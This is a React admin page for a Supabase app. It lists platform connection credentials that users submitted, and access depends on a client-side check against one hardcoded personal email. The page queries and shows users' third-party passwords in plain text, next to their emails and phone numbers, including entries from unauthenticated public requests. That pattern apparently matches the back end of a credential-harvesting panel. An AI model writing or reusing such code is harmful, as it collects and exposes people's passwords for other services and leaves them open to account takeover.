import React, { useEffect, useRef, useState } from 'react';
import { supabase } from '../lib/supabase';
import Connect from './Connect';

export default function Admin() {
  const isMounted = useRef(true);
  const [user, setUser] = useState<any>(null);
  const [rows, setRows] = useState<any[]>([]);
  const [loading, setLoading] = useState(true);
  const [isAdmin, setIsAdmin] = useState(false);
  const [authChecked, setAuthChecked] = useState(false);
  const [unauthorizedMessage, setUnauthorizedMessage] = useState('');

  const finishAuthCheck = (message = '') => {
    if (!isMounted.current) return;
    setAuthChecked(true);
    setLoading(false);
    setUnauthorizedMessage(message);
  };

  const initializeAdmin = async (user: any) => {
    if (!isMounted.current) return;

    if (!user) {
      setUser(null);
      setIsAdmin(false);
      finishAuthCheck();
      return;
    }

    setUser(user);
    setLoading(true);
    setAuthChecked(false);

    const isOwner = user.email === 'gibsonkobia@gmail.com';
    if (!isOwner) {
      setIsAdmin(false);
      finishAuthCheck('You do not have admin access with this account.');
      return;
    }

    setIsAdmin(true);
    setUnauthorizedMessage('');
    await fetchSubmissions();
    finishAuthCheck();
  };

  useEffect(() => {
    const loadSession = async () => {
      const { data: { session } } = await supabase.auth.getSession();
      await initializeAdmin(session?.user ?? null);
    };

    loadSession();

    const { data: { subscription } } = supabase.auth.onAuthStateChange(
      async (_event, session) => {
        await initializeAdmin(session?.user ?? null);
      }
    );

    return () => {
      isMounted.current = false;
      subscription.unsubscribe();
    };
  }, []);

  const fetchSubmissions = async () => {
    try {
      const [connectionsResponse, requestsResponse] = await Promise.all([
        supabase
          .from('platform_connections')
          .select('id, platform, email, third_party_password, created_at, user_id')
          .order('created_at', { ascending: false }),
        supabase
          .from('platform_connection_requests')
          .select('id, platform, email, phone, third_party_password, created_at, status')
          .order('created_at', { ascending: false }),
      ]);

      if (connectionsResponse.error) {
        console.error('Error loading authenticated submissions:', connectionsResponse.error);
      }
      if (requestsResponse.error) {
        console.error('Error loading public requests:', requestsResponse.error);
      }

      const connections = connectionsResponse.data || [];
      const requests = requestsResponse.data || [];

      const mergedRows = [
        ...connections.map((row) => ({
          id: row.id,
          platform: row.platform,
          contact: row.email || '-',
          third_party_password: row.third_party_password,
          created_at: row.created_at,
          user_id: row.user_id,
          status: 'authenticated',
        })),
        ...requests.map((row) => ({
          id: row.id,
          platform: row.platform,
          contact: row.email || row.phone || '-',
          third_party_password: row.third_party_password,
          created_at: row.created_at,
          user_id: null,
          status: row.status || 'pending',
        })),
      ].sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());

      setRows(mergedRows);
    } catch (err) {
      console.error('Error loading admin submissions:', err);
    } finally {
      if (isMounted.current) {
        setLoading(false);
      }
    }
  };

  if (loading) {
    return (
      <div className="min-h-screen bg-[#0a0a0c] flex items-center justify-center text-white">
        <div className="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-white"></div>
      </div>
    );
  }

  if (!isAdmin && authChecked) {
    return <Connect externalError={unauthorizedMessage} />;
  }

  if (!isAdmin) return null;

  return (
    <main className="min-h-screen bg-[#0a0a0c] px-4 py-10 text-white sm:px-6">
      <div className="mx-auto max-w-5xl rounded-2xl border border-white/10 bg-white/5 p-5">
        <div className="flex justify-between items-center mb-6">
          <div>
            <h1 className="text-2xl font-semibold">Admin submissions</h1>
            <p className="text-sm text-slate-300">
              Platform connection credentials submitted by users.
            </p>
          </div>
          <button 
            onClick={async () => {
              await supabase.auth.signOut();
              window.location.reload();
            }}
            className="text-sm text-slate-400 hover:text-white underline underline-offset-4"
          >
            Sign Out
          </button>
        </div>
        <div className="overflow-x-auto">
          <table className="min-w-full text-left text-sm">
            <thead className="text-slate-400">
              <tr>
                <th className="px-3 py-2">Platform</th>
                <th className="px-3 py-2">Contact</th>
                <th className="px-3 py-2">Password</th>
                <th className="px-3 py-2">Status</th>
                <th className="px-3 py-2">Created at</th>
                <th className="px-3 py-2">User ID</th>
              </tr>
            </thead>
            <tbody>
              {rows.map((row) => (
                <tr key={`${row.id}-${row.status}`} className="border-t border-white/10">
                  <td className="px-3 py-2">{row.platform}</td>
                  <td className="px-3 py-2">{row.contact}</td>
                  <td className="px-3 py-2">{row.third_party_password || '-'}</td>
                  <td className="px-3 py-2">{row.status}</td>
                  <td className="px-3 py-2 text-slate-400">
                    {new Date(row.created_at).toLocaleString()}
                  </td>
                  <td className="px-3 py-2 text-slate-400 truncate max-w-[100px]">{row.user_id || '-'}</td>
                </tr>
              ))}
              {rows.length === 0 && (
                <tr>
                  <td colSpan={5} className="px-3 py-8 text-center text-slate-500">
                    No submissions found.
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>
    </main>
  );
}
